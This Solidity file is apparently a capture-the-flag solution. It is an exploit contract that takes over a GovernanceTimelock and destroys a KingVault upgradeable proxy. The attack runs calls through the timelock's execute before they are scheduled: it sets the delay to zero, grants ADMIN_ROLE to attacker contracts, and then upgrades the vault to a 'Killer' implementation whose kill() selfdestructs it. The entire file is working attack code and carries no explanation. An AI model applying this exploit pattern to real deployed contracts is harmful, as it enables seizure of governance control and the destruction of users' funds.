pragma solidity 0.8.4;

import "./Setup.sol";

contract Killer is UUPSUpgradeable {

    function attack(address gt, address att) public {
        GovernanceTimelock g = GovernanceTimelock(payable(gt));

        address[] memory batch1_addresses = new address[](4);
        uint256[] memory batch1_values = new uint256[](4);
        bytes[] memory batch1_calldata = new bytes[](4);

        g.grantRole(keccak256("PROPOSER_ROLE"), address(this));

        //Batch 1
        //First call to updateDelay
        batch1_addresses[0] = address(gt);
        batch1_values[0] = 0;
        batch1_calldata[0] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));

        //Then call to grantrole
        batch1_addresses[1] = address(gt);
        batch1_values[1] = 0;
        batch1_calldata[1] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("ADMIN_ROLE"), address(this));

        batch1_addresses[2] = address(gt);
        batch1_values[2] = 0;
        batch1_calldata[2] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("ADMIN_ROLE"), address(att));

        //Third call to relay the attack to the contract
        batch1_addresses[3] = address(this);
        batch1_values[3] = 0;
        batch1_calldata[3] = abi.encodeWithSignature("attack(address,address)", address(gt), address(att));

        g.schedule(batch1_addresses, batch1_values, batch1_calldata, 0);

    }

    function kill() public {
        selfdestruct(payable(address(0)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract agusduhaAttacker {

    KingVault kv;
    KingVault kvp;
    GovernanceTimelock gt;

    address[] batch1_addresses;
    uint256[] batch1_values;
    bytes[] batch1_calldata;

    address[] batch2_addresses;
    uint256[] batch2_values;
    bytes[] batch2_calldata;


        //sch_address.push(address(kvp));
        //sch_values.push(0);
        //sch_data.push(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(k), hex"41c0e1b5"));

    constructor(address inst) payable {
        kv = Setup(inst).kingVault();
        kvp = KingVault(address(Setup(inst).instance()));
        gt = GovernanceTimelock(payable(kvp.owner()));
        Killer k = new Killer();

        //Batch 1
        //First call to updateDelay
        batch1_addresses.push(address(gt));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        //Then call to grantrole
        batch1_addresses.push(address(gt));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("ADMIN_ROLE"), address(k)));

        batch1_addresses.push(address(gt));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("ADMIN_ROLE"), address(this)));

        //Then call to relay the attack to the contract
        batch1_addresses.push(address(k));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("attack(address,address)", address(gt), address(this)));

        //Call
        gt.execute(batch1_addresses, batch1_values, batch1_calldata, 0);
        gt.grantRole(keccak256("PROPOSER_ROLE"), address(this));

        batch2_addresses.push(address(kvp));
        batch2_values.push(0);
        batch2_calldata.push(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(k), hex"41c0e1b5"));

        gt.schedule(batch2_addresses, batch2_values, batch2_calldata, 0);
        gt.execute(batch2_addresses, batch2_values, batch2_calldata, 0);

    }

    receive() external payable { }

}